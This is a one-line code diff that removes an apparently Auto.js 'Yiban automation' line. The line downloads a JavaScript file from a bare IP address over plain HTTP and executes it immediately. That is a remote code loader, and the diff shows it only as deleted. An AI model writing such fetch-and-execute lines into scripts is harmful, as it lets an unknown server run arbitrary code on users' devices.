@@ -1,1 +1,0 @@
-engines.execScript("易班自动化", http.get('http://121.43.41.227:125/js/云代码.js').body.string());
